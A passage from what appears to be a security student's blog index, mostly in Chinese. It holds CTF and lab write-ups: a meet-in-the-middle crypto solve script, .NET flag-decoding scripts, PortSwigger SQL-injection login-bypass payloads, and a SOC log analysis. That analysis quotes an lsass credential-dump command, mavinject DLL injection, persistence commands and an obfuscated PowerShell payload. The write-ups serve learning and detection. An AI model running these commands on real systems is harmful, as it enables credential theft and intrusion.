112112804524582393858675176460595338484428048338611753655869733059768929120327158352572131172253127933611583356499525126040647290513660017529498493355846656594143774393256151536590212031416153303085867445488047592792290033548349001067687775149867134619114482370143917491889371548968347491490942978508386339813 :::\nRecon # 這一題也是看了別人的WP1，有了一些想法，其實題目的敘述有一點點玄機(但我當時沒想到)，因為題目有提到key space是$10^{15}$，因為看了一下簡單的source code，他是創了五把key $$ key_1 \\leftarrow Rand(2, 1000)^{65537}\\ % \\ p\\ key_2 \\leftarrow Rand(1002, 2000)^{65537}\\ % \\ p\\ key_3 \\leftarrow Rand(2002, 3000)^{65537}\\ % \\ p\\ key_4 \\leftarrow Rand(3002, 4000)^{65537}\\ % \\ p\\ key_5 \\leftarrow Rand(4002, 5000)^{65537}\\ % \\ p\\ $$ 再分別用這五把key進行運算$enc=flag*key\\ %\\ p$ 乍看之下好像很難，但其實掌握題目講到的縮小key space的角度出發就會有一點概念要用MITM attack，畢竟他還有給$hint=key_1 \\oplus key_2 \\oplus key_3 \\oplus key_4 \\oplus key_5$這個hint 具體來說會變成 $$ hint\\oplus key_5\\oplus key_4\\oplus key_3=key_1\\oplus key_2 $$ 而TA也有給$key_5=pow(4668, 65537, p)$，代表key space真的減少超多($10^6$)\nExploit # :::info 不同的寫法所處理的time complexity會不一樣 :::\nfrom tqdm import trange from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse import numpy as np import gmpy2 p = 92017932396773207330365205210913184771249549355771692523246399384571269833668487945963934319507538171501041280674304304879328757539798699280378034748542218248740777575679398093116579809607067129824965250071416089841516538588253944223235904445546895574651603636188746948921937704060334290364304972412697492577 enc = 87051682992840829567429886737255563980229964191963649650455667117285375334750716083826527488071966389632402954644144719710970265754062176648776448421065665281172133368294041777397049228273163978348132440822019295870429065335674151133125629968366491582233750452365390672536361224322642295053741696809519283644 hint = 112112804524582393858675176460595338484428048338611753655869733059768929120327158352572131172253127933611583356499525126040647290513660017529498493355846656594143774393256151536590212031416153303085867445488047592792290033548349001067687775149867134619114482370143917491889371548968347491490942978508386339813 key_1 = [pow(i, 65537, p) for i in range(2, 1001)] key_2 = [pow(i, 65537, p) for i in range(1002, 2001)] key_3 = [pow(i, 65537, p) for i in range(2002, 3001)] key_4 = [pow(i, 65537, p) for i in range(3002, 4001)] key_5 = pow(4668, 65537, p) first_xor_result = {} for i in trange(len(key_1)): for j in range(len(key_2)): first_xor_result[key_1[i] ^ key_2[j]] = [i, j] second_xor_result = {} tmp = key_5 ^ hint for i in trange(len(key_3)): for j in range(len(key_4)): second_xor_result[key_3[i] ^ key_4[j] ^ tmp] = [i, j] if key_3[i] ^ key_4[j] ^ tmp in first_xor_result: print(f\u0026#34;j = {j}\u0026#34;) result = key_3[i] ^ key_4[j] ^ tmp print(f\u0026#34;result = {result}\u0026#34;) break key_1_arg = first_xor_result[result][0] key_2_arg = first_xor_result[result][1] key_3_arg = second_xor_result[result][0] key_4_arg = second_xor_result[result][1] assert key_1[key_1_arg] ^ key_2[key_2_arg] ^ key_3[key_3_arg] ^ key_4[key_4_arg] ^ key_5 == hint flag = enc * inverse(key_1[key_1_arg], p) % p flag = flag * inverse(key_2[key_2_arg], p) % p flag = flag * inverse(key_3[key_3_arg], p) % p flag = flag * inverse(key_4[key_4_arg], p) % p flag = flag * inverse(key_5, p) % p print(long_to_bytes(flag)) Flag: FLAG{enCrypTIon_wI7H_A_kEy_i5_N0t_secur3_7Hen_h0w_ab0u7_f1ve_Keys}\nReference # Write Up from eric070021\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":467,"href":"/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/","title":"Simple Welcome 0x02 \u0026 0x05(Lab - Nine \u0026 Nine-Revenge)","section":"Securities","content":" Simple Welcome 0x02 \u0026amp; 0x05(Lab - Nine \u0026amp; Nine-Revenge) # Background # Convert.FromBase64String(String) Method in C# String.Substring 方法\nSource Code # :::spoiler C# From dnSpy\n// Nine.Stage // Token: 0x0600000D RID: 13 RVA: 0x00002694 File Offset: 0x00000894 private void Flag() { this.font = new Font(this.fontFamily, 35f, FontStyle.Regular); byte[] array = Convert.FromBase64String(\u0026#34;LwcvGwpuiPzT7+LY9PPo6eLpuiY7vTY6ejz2OH1pui5uDu6+LY5unpui+6uj14qmpuipqfo=\u0026#34;.Replace(\u0026#34;pui\u0026#34;, \u0026#34;\u0026#34;).Substring(1)); for (int i = 0; i \u0026lt; array.Length; i++) { array[i] ^= 135; } this.SetMessageBox(Encoding.UTF8.GetString(array)); } :::\nRecon # 起手式一定用DIE或其他檢測tool看一下是用哪種東西編譯或有沒有加殼 我一開始以為可以用IDA之類的東西反編譯他，但是顯然IDA沒辦法解析.NET file，這一題也是看了別人的WP1才知道有dnSpy這東西可以用 執行程式 實際執行起來會發現它就是個小遊戲，可以用方向鍵操控人移動或是移開石頭，重點是要拿到鑰匙並開鎖拿到旗子，玩了好久都沒成功，所以想說可以用dnSpy看一下可以用的東西 用dnSpy看source code 在/Nine/Nine.exe/Nine/Stage@02000004/Flag()以及/Nine-revenge/Nine-revenge.exe/Nine/Stage@02000004/Flag()都可以直接看到flag function怎麼寫的，所以其實這一題只要知道dnSpy這東西，其實就過於簡單 :::spoiler Function Path Screenshot ::: Exploit # 也是可以直接用C#的線上editor，不過如果不會寫的話就可以直接看source code然後用熟悉的語言寫script\nNine Exp import base64 enc_flag = \u0026#34;LwcvGwPze6PKg9eLY6/Lk7P7Y8+/m89jO2O/m8eLY5tjz7+7p4Njh6PXY9+bp5Obs4vT6\u0026#34; enc_flag = enc_flag[1:] enc_flag = base64.b64decode(enc_flag) flag = \u0026#34;\u0026#34; for i in enc_flag: flag += hex(i ^ 135)[2:] print(bytes.fromhex(flag).decode(\u0026#39;utf-8\u0026#39;)) Nine-Revenge Exp import base64 enc_flag = \u0026#34;LwcvGwpuiPzT7+LY9PPo6eLpuiY7vTY6ejz2OH1pui5uDu6+LY5unpui+6uj14qmpuipqfo=\u0026#34; enc_flag = enc_flag.replace(\u0026#34;pui\u0026#34;, \u0026#34;\u0026#34;)[1:] enc_flag = base64.b64decode(enc_flag) flag = \u0026#34;\u0026#34; for i in enc_flag: flag += hex(i ^ 135)[2:] print(bytes.fromhex(flag).decode(\u0026#39;utf-8\u0026#39;)) Reference # Write Up from eric070021\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":468,"href":"/side-project/special-topic-of-tzu-chi-at-tcivs/","title":"Special Topic of Tzu-Chi at TCIVS","section":"Side Projects","content":" Special Topic of Tzu-Chi at TCIVS # tags: TCIVS Side Project Special Topic # :::spoiler [TOC] :::\nPurpose of this file # I just want to write up some problems while I set up the environment and hardware of this project Hardware info. # Spec. Raspberry Pi 3 Model B+ CPU ARM Cortex-A53 1.4GHz RAM 1GB SRAM Wi-Fi 2.4GHz and 5GHz Ethernet speed 300Mbps Bluetooth 4..2 Set up sequence(Ideal) # Install OS to Raspberry pi You can just check this page\n$ vim /etc/netplan/50-cloud-init.yaml (add the line at the end, and the indentation is very important) wifis: wlan0: dhcp4: true optional: true access-points: \u0026#34;home network\u0026#34;: password: \u0026#34;123456789\u0026#34; $ sudo reboot Install Anaconda in a correct version $ cd ~ $ curl -O https://repo.anaconda.com/archive/Anaconda3-2021.04-Linux-aarch64.sh $ bash Anaconda3-2021.04-Linux-aarch64.sh $ vim ~/.bashrc (add \u0026#34;export PATH=\u0026#39;/home/ubuntu/anaconda3/bin:$PATH\u0026#39; at the end\u0026#34;) $ source ~/.bashrc $ sudo reboot Install the Library you need $ conda install -c anaconda scipy $ conda install -c conda-forge/label/broken tensorflow $ pip install opencv-contrib-python $ conda install -c anaconda numpy $ conda install -c anaconda requests $ conda install -c conda-forge keras $ conda install -c conda-forge imutils $ conda install -c conda-forge face_recognition $ conda install -c conda-forge dlib Run the python file you mount from the external disk, e.g. flash disk Problem # There\u0026rsquo;re 3 different OSs can choose including Raspberry Pi OS, Ubuntu server, Ubuntu desktop\nFirst of all is Raspberry Pi OS(32-bits), because it\u0026rsquo;s an official recommendation, I install it first. But as I show the spec. above, the CPU is 64-bits and you must run Raspberry Pi Imager before you install OS to Raspberry Pi. Then your OS architecture will be not compatible with Anaconda though it has a 32-bits version as well. You\u0026rsquo;ll get the error. The second one is Ubuntu-Desktop (22.04 or 20.04). It\u0026rsquo;ll get frozen all the time because of the small SRAM with 1GB The third one seems quite a good choice as an OS. It\u0026rsquo;ll not get frozen because it\u0026rsquo;s just a simple CLI system and it also has an aarch64 version. Then the statements below are the problems you\u0026rsquo;ll encounter. If I install Anaconda correctly, I\u0026rsquo;ll encounter a problem that conda create instruction can not be used. You\u0026rsquo;ll get an error message like this: Illegal instruction(core dumped).\nSolution by installing Miniconda. But\u0026hellip;miniconda still has another problem: version conflict with the library. So, this is not the best solution as well.\nFor more information on this solution: though I can use conda create instruction, I can not install python with the 3.6 version. The reason that I must install this version is for the library I want to install later. If I don\u0026rsquo;t install version 3.6, I can\u0026rsquo;t install imutils, face_recognition, and dlib at the same time. The other library list above including scipy, TensorFlow, NumPy, and so on will install successfully in versions 3.6 to 3.9.\nBriefly speaking, because of my OS architecture, I can\u0026rsquo;t install these 3 libraries by the statement that anaconda official supplied. I can install the package available on noarch or aarch64 platform only.\nFor imutils, like the image below(img1) $ conda install --channel https://conda.anaconda.org/gilbertfrancoins imutils\nFor face_recognition, like the image below(img2) $ conda install --channel https://conda.anaconda.org/conda-forge face_recognition\nYou can check the error on this page, then there is another problem I encounter is I can not use anaconda instruction to search the library package. So, I use my laptop(a normal win10 system) to search. BTW, you can not use the x86 version, because it\u0026rsquo;ll crash while the installation I also followed this article and tried to address this problem. Though it can use anaconda instruction smoothly, it still has some problems to solve(I forgot the problem, QAQ)\nYou might be wondering why I don\u0026rsquo;t use pip instruction. Because you\u0026rsquo;ll get an error message like this: Illegal instruction(core dumped).\nOther problems must address\nIf you install OS and Anaconda successfully. $ python $ import numpy (error message) $ Illegal instruction(core dumped) Conclusion for the above # The solutions above are not suitable for this project\nNew Solution # This solution seems fine so far, so I write it up as below\nFirst, we can install Raspberry Pi OS (64-bit) by Raspberry Pi Imager. It has a desktop version and is still compatible with the hardware. Second, install Miniconda by following the instruction on this page(PS version is Miniconda3-py37_4.9.2-Linux-aarch64.sh) Third, create a new environment in Anaconda without python. You should install python independently(v3.6). $ conda install -c moussi python $ conda install -c akode face_recognition_models $ conda install -c gilbertfrancois imutils $ conda install -c conda-forge fortran_stdlib $ conda install -c jetson-tx2 scipy $ conda install -c intel tensorflow-base $ conda install -c anaconda numpy $ conda install -c conda-forge/label/cf202003 requests $ conda install -c conda-forge keras $ pip install opencv-contrib-python These libraries can be installed with python=3.6, but TensorFlow. Please go to this page and search the library you want to install(set the platform filter as noarch or Linux-aarch64) Practical Solution # In order to avoid not being able to do it in the end, we change another solution with higher success rate - we used Arduino instead. You can check the code in here. And our os platform is my x86 laptop, we don\u0026rsquo;t have the software compatible problem.\n"},{"id":469,"href":"/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/","title":"SQLi - APPRENTICE","section":"Securities","content":" SQLi - APPRENTICE # tags: Portswigger Web Security Academy Web # [TOC]\nLab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data # Hint: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: SELECT * FROM products WHERE category = 'Gifts' AND released = 1 Exp # Payload: https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20# :::spoiler Success Screenshot :::\nLab: SQL injection vulnerability allowing login bypass # Hint: This lab contains a SQL injection vulnerability in the login function. To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. Exp # Payload: Username: administrator' or '1'='1' -- # Password: Arbitrary :::spoiler Success Screenshot :::\nReference # Burp Suite Security Academy Writeup\n"},{"id":470,"href":"/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/","title":"TaiwanHolyHigh - SoC基礎維運 - ArcSight教學","section":"Securities","content":" TaiwanHolyHigh - SoC基礎維運 - ArcSight教學 # Set Up # 先進到https://bit.ly/44IFecN下載ArcSight Console，並且全部default下一步\n(editor需要admin權限)進入localhost host DNS解析 -\u0026gt; C:\\Windows\\System32\\drivers\\etc\\host 新增 211.75.237.80 chtpoc 打開ArcSight Console，用之前提供的帳密以及最後打chtpoc，進行登入 登入之後的狀態 ArcSight預設有分大小寫 活動頻道可以儲存0 規則 # WAF規則 Firewall規則 IPS Firewall-BotNet Snort Trojan WineventLog 清單 # 抑制清單 弱掃清單 規則 # 即時規則 中繼站監控 中繼站監控持續連線 WAF弱掃 "},{"id":471,"href":"/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/","title":"TaiwanHolyHigh - SoC基礎維運 - HW2","section":"Securities","content":" TaiwanHolyHigh - SoC基礎維運 - HW2 # Background # Sysmon Event ID 事件識別碼 1：處理程序建立 # 處理程序建立事件會提供新建立處理程序的延伸資訊。 完整的命令列提供處理程序執行的內容。 ProcessGUID 欄位是跨定義域此處理程式的唯一值，可讓事件相互關聯更容易。 雜湊是檔案的完整雜湊，具有 HashType 欄位中的演算法。\n事件識別碼 8：CreateRemoteThread # CreateRemoteThread 事件會偵測處理程序何時在另一個處理程序中建立執行緒。 惡意程式碼會使用這項技術來插入程式碼，並隱藏在其他處理程序中。 事件表示來源和目標處理程序。 其會提供將在新執行緒中執行之程式碼的資訊：StartAddress、StartModule 和 StartFunction。 請注意，系統會推斷 StartModule 和 StartFunction 欄位，如果起始位址位於載入的模組或已知的匯出函式之外，這些欄位可能會是空的。\n事件識別碼 11：FileCreate # 建立或覆寫檔案時，系統會記錄檔案建立作業。 此事件適用於監視自動啟動位置，例如開機資料夾，以及暫存和下載目錄，這是初始感染期間惡意程式碼放置的常見位置。\n事件識別碼 13：RegistryEvent (值已設定) # 此登錄事件類型會識別登錄值修改。 事件會記錄針對類型為 DWORD 和 QWORD 的登錄值所寫入的值。\nRecon - Event Log呈現的攻擊順序 # Event ID: 8 → CreateRemoteThread 首先看到23/12/17 15:1024的時候，由==NT AUTHORITY\\SYSTEM==發起的新的thread，從原本的Process(ID: 820)幫另外一個Process(ID: 7464)建立，誠如MSDN上的說明這應該是惡意程式為了不要被砍掉 比較經典的案例是類似NTU CS助教 - @Ice1187 在Window Malware講到的reflective dll injection，也就是Mitre紀載的==T1055.001==，其本質上就是利用CreateRemoteThread在一個正常的process開一個thread，然後做一些惡意的事情，這樣的話defender也不會把它砍掉，因為從外部看，就只是一個正常的process Kernel開Thread 接著為了成功開一個thread，就需要kernel base的dll做一些事情，包含:\nC:\\Windows\\SysWOW64\\DllHost.exe\u0026#34; /Processid:{776DBC8D-7347-478C-8D71-791E12EF49D8} consent.exe 6504 376 000001EC1C876D30 啟動惡意script 從以下資訊可以知道該惡意script(auto-attack.bat)是由cmd執行起來的，另外執行這一串command的是explorer.exe代表他可能是執行在檔案總管執行或是在桌面執行\nParentProcessId 3176 ParentImage C:\\Windows\\explorer.exe ParentCommandLine C:\\Windows\\Explorer.EXE ParentUser W10C\\Admin CommandLine \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ProcessId 7544 選擇YN 從以下資訊可以知道choice.exe是由auto-attack.bat執行起來的，看了MSDN的說明，知道其會有一個時間限制以及要選擇的提示\nParentProcessId 7544 ParentImage C:\\Windows\\System32\\cmd.exe ParentCommandLine \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser W10C\\Admin OriginalFileName choice.exe CommandLine choice /c YN PowerShell - Get lsass.dmp 這條command就好玩了，接著auto-attack.bat又接續執行powershell，並且執行command如下，這一條command一開始看不太懂，隨便搜尋發現是一個經典的payload，主要是參考@3gstudent的文章《MiniDumpWriteDump via COM+ Services DLL》的利用測試，一般來說我們都會想辦法用procdump之類的工具把lsass或是SYSTEM dump出來，但其實也可以用其他internal dll呼叫MiniDump的方式，把東西拿到手，範例的話可以參考comsvcs MiniDump examples\n\u0026ldquo;C:\\Windows\\System32\\rundll32.exe\u0026rdquo; C:\\Windows\\System32\\comsvcs.dll MiniDump \u0026lt;PID\u0026gt; \\Windows\\Temp\u0026lt;filename\u0026gt;.dmp full\n其實就和這一條payload有87趴像，中間的 ==((Get-Process lsass).Id)== 就是在抓lsass的PID，另外@3gstudent也有提到這個必須要是管理員權限才可以執行\nParentProcessId 7544 ParentImage C:\\Windows\\System32\\cmd.exe ParentCommandLine \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser W10C\\Admin OriginalFileName PowerShell.EXE CommandLine powershell.exe -NoProfile -Command \u0026#34;rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\\Windows\\Temp\\lsass.dmp full\u0026#34; ProcessId 8832 接著就是真的實際執行該條command後拿到lsass.dmp\nParentProcessId 8832 ParentImage C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ParentCommandLine powershell.exe -NoProfile -Command \u0026#34;rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\\Windows\\Temp\\lsass.dmp full\u0026#34; ParentUser W10C\\Admin OriginalFileName RUNDLL32.EXE CommandLine \u0026#34;C:\\Windows\\system32\\rundll32.exe\u0026#34; C:\\Windows\\System32\\comsvcs.dll MiniDump 892 C:\\Windows\\Temp\\lsass.dmp full Event ID: 11 - FileCreate\nTargetFilename C:\\Windows\\Temp\\lsass.dmp CreationUtcTime 2023-12-17 07:10:29.916 User W10C\\Admin Timeout 從以下紀錄得知auto-attack.bat又繼續搞事，看了MSDN的說明，有點類似sleep的功能，雖然不知道加這行要幹嘛?\nParentProcessId 7544 ParentImage C:\\Windows\\System32\\cmd.exe ParentCommandLine \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser W10C\\Admin ProcessId 6080 OriginalFileName timeout.exe CommandLine TIMEOUT /T 3 FileCreate - notepad.exe 這個我猜是直接embedded在auto-attack.bat裡面的一段notepad的bytecode，以防受害電腦沒有notepad.exe就可以直接創一個(?)不是很確定\nImage C:\\Windows\\System32\\cmd.exe TargetFilename C:\\Windows\\Temp\\notepad.exe CreationUtcTime 2023-12-17 07:10:32.119 User W10C\\Admin Real Attack Payload 原本的payload很明顯就是base64的encode，不過實際解過發現參雜很多trash byte，如果把這些東西都拿掉就會很明朗，這也是一個常見的技巧，就是為了不要讓defender或是其他防毒知道payload pattern被已知database match出來，所以做了一些scramble，視情況有時候這種scramble的題目真的很討厭，不管是BalsnCTF 2023 - Kill-4或PicoCTF - Some Assembly Required 3都沒有解出來\n\u0026gt;\u0026gt;\u0026gt; from base64 import * \u0026gt;\u0026gt;\u0026gt; payload = \u0026#34;JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==\u0026#34; \u0026gt;\u0026gt;\u0026gt; decode = b64decode(payload.encode()) \u0026gt;\u0026gt;\u0026gt; decode.replace(b\u0026#39;\\x00\u0026#39;, b\u0026#39;\u0026#39;).decode() \u0026#39;\u0026amp; (gcm (\\\u0026#39;ie{0}\\\u0026#39; -f \\\u0026#39;x\\\u0026#39;)) (\u0026#34;Wr\u0026#34;+\u0026#34;it\u0026#34;+\u0026#34;e-H\u0026#34;+\u0026#34;ost \\\u0026#39;H\u0026#34;+\u0026#34;el\u0026#34;+\u0026#34;lo, fr\u0026#34;+\u0026#34;om P\u0026#34;+\u0026#34;ow\u0026#34;+\u0026#34;erS\u0026#34;+\u0026#34;h\u0026#34;+\u0026#34;ell!\\\u0026#39;\u0026#34;)\u0026#39; 所以這一個正確的payload應該是 ==\u0026amp; (gcm (\u0026lsquo;ie{0}\u0026rsquo; -f \u0026lsquo;x\u0026rsquo;)) (\u0026ldquo;Write-Host \u0026lsquo;Hello, from PowerShell!\u0026rsquo;\u0026rdquo;)==\n其實後來仔細找找就會發現redcanary的文章中就有提到這一個obfuscated，就如同上面寫的，他就是Invoke-Expression \u0026quot;Write-Host 'Hello, from PowerShell!'\u0026quot;，如果實際丟到powershell的話就會在console印出Hello, from PowerShell!的字樣\nSchtasks.exe 這個也是惡意軟體常見的操作，為了要避免重開機或是斷網等駭客不想看到的風險，會利用registry或是排程工具做到定期實質的操作，由下面的紀錄可以知道有是auto-attack.bat發起的process\nParentProcessId 7544 ParentImage C:\\Windows\\System32\\cmd.exe ParentCommandLine \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser W10C\\Admin OriginalFileName schtasks.exe CommandLine schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR \u0026#34;cmd /c date /T \u0026gt; C:\\Windows\\Temp\\current_date.txt\u0026#34; 詳細的排程指令見MSDN或是直接看chatgpt的說明 接著就會看到在Windows存放Tasks的地方真的有一個叫做CMDTestTask被Create出來:\nProcessId 1572 Image C:\\Windows\\system32\\svchost.exe TargetFilename C:\\Windows\\System32\\Tasks\\CMDTestTask CreationUtcTime 2023-12-17 07:10:35.212 User NT AUTHORITY\\SYSTEM Timeout → Query Task → Delete Task 從以下操作可以知道攻擊者應該只是想要知道這個功能有沒有辦法操作在victim中\nParentProcessId 7544 ParentImage C:\\Windows\\System32\\cmd.exe ParentCommandLine \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser W10C\\Admin OriginalFileName schtasks.exe CommandLine schtasks /Query /TN CMDTestTask ↓ ParentProcessId 7544 ParentImage C:\\Windows\\System32\\cmd.exe ParentCommandLine \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser W10C\\Admin OriginalFileName schtasks.exe CommandLine schtasks /Delete /TN CMDTestTask /F Mavinject 這個攻擊手法也是很有趣，詳細可以看Mitre的記錄-T1218-013\n攻擊者可能會濫用mavinject.exe 來代理惡意程式碼的執行。Mavinject.exe 是Microsoft 應用程式虛擬化注入器，它是一種Windows 實用程序，可以作為Microsoft 應用程式虛擬化(App-V) 的一部分將程式碼注入到外部進程中。 攻擊者可能會濫用 mavinject.exe 將惡意 DLL 注入正在運行的進程（即動態連結程式庫注入），從而允許執行任意程式碼（例如 C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL）。 由於 mavinject.exe 可能經過 Microsoft 數位簽名，因此透過此方法代理執行可能會逃避安全性產品的偵測，因為執行被隱藏在合法進程下。 除了動態連結程式庫注入之外，Mavinject.exe 還可以被濫用透過其 /HMODULE 命令列參數（例如 mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER）執行導入描述符注入。 此指令會將由指定 DLL 組成的導入表條目注入到模組的給定基底位址處。\nParentProcessId 7544 ParentImage C:\\Windows\\System32\\cmd.exe ParentCommandLine \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser W10C\\Admin OriginalFileName PowerShell.EXE CommandLine powershell.exe -NoProfile -Command \u0026#34;mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\\Windows\\System32\\vbscript.dll\u0026#34; ProcessId 11488 從以上payload發現和Mitre上的記錄一模一樣，把lsass的process inject到vbscript.dll這種windows高度信任的檔案\nParentProcessId 11488 ParentImage C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ParentCommandLine powershell.exe -NoProfile -Command \u0026#34;mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\\Windows\\System32\\vbscript.dll\u0026#34; ParentUser W10C\\Admin OriginalFileName mavinject64.exe CommandLine \u0026#34;C:\\Windows\\system32\\mavinject.exe\u0026#34; 892 /INJECTRUNNING C:\\Windows\\System32\\vbscript.dll 所以下一個log就實際執行上一個command\nTimeout → Powershell Hello Payload → Timeout → CMD Hello Payload → Timeout 接著auto-attack.bat又執行powershell的下列command:\nParentProcessId 7544 ParentImage C:\\Windows\\System32\\cmd.exe ParentCommandLine \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser W10C\\Admin OriginalFileName PowerShell.EXE CommandLine powershell.exe -NoProfile -Command \u0026#34;(ps lsass).Modules | Where-Object { $_.ModuleName -eq \u0026#39;vbscript.dll\u0026#39; }\u0026#34; 接著重複執行第9步的powershell payload:\nParentProcessId: 7544 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser: W10C\\Admin OriginalFileName: PowerShell.EXE CommandLine: powershell.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA== ProcessId: 13276 再執行一次CMD版本的Hello Payload:\nParentProcessId: 7544 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser: W10C\\Admin OriginalFileName: Cmd.Exe CommandLine: cmd /c echo Hello, from CMD! Open Notepad.exe → Timeout 這一段payload就只是在啟動Notepad.exe這個application而已\nParentProcessId: 7544 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser: W10C\\Admin OriginalFileName: RUNDLL32.EXE CommandLine: rundll32.exe pcwutl.dll,LaunchApplication C:\\Windows\\System32\\notepad.exe Open Service Control Manager → Timeout → Query Registry → Delete Registry 根據MSDN的說明，==sc.exe==是一個在資料庫中建立服務的子機碼和專案的工具，而記錄如下:\nParentProcessId: 7544 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /C \u0026#34;C:\\Users\\Admin\\Desktop\\auto-attack.bat\u0026#34; ParentUser: W10C\\Admin OriginalFileName: sc.exe CommandLine: sc create CMDTestService type=own binPath=\u0026#34;cmd /c date /T \u0026gt; C:\\Windows\\Temp\\current_date.txt\u0026#34; 總的來說，目的是創建一個名為 \u0026ldquo;CMDTestService\u0026rdquo; 的服務，該服務指定在其本身process中執行的服務，且不會與其他服務共用可執行檔，並且它的主要功能是運行一個命令，將當前日期寫入到指定的文本文件中，也的確在Event ID: 13中看到創了一個registry event在==HKLM\\System\\CurrentControlSet\\Services\\CMDTestService\\Start== 不過接著就像上面看到排程的操作一樣，他進行了該Event的query，當query到的時候就是確定惡意程式可以透過registry進行操作，並且直接把該event刪除，詳細紀錄如下:\nOriginalFileName: sc.exe CommandLine: sc query CMDTestService ↓ OriginalFileName: sc.exe CommandLine: sc delete CMDTestService Conclusion # 總結以上的操作，會發現auto-attack.bat在做的事情只有幾件事:\n(攻擊1)利用comsvcs.dll搭配MiniDump把lsass拿到手 (攻擊2)利用notepad.exe執行base64並且obfuscate過後的payload，如果把該payload改成更進階或更惡意的手法，就會造成更大的損失 (攻擊3)利用Schtasks.exe這樣內建的排程工具，可以做到定期執行惡意的動作(Persistent)，諸如定期回報給C2 server以便更好掌握手中的肉機，後續嘗試DDoS攻擊可以用到，詳細可以看Mitre T1053有更多的手法可以參考 (攻擊4)利用mavinject.exe把lsass process注入到正常執行且可信度高的process，如果我們是注入惡意的process，是不是就可以達到更大的受害範圍?詳細可以參考Mitre T1218-013 (攻擊5)有點像攻擊2的另一個版本，其實是利用更強大的powershell進行一樣的攻擊，payload的靈活度也大大提升 (攻擊6)利用sc.exe設定registry，可以先看看Mitre T1569-002的說明，攻擊者可以利用這類型的手法和工具，諸如PsExec, sc.exe等，達到遠端執行command的功能 建議處理措施 # 根據Mitre針對T1055(Reflective DLL Injection)的mitigations就是針對該行為的patter進行endpoint的偵測(prevention) 至於針對T1218-013(Mavinject)的mitigations有兩種， 其一是把該功能disable或remove； 其二是做好execution prevention，避免被濫用 針對T1053(Schtasks.exe)的mitigation，有四種， 其一是稽核，PowerSploit 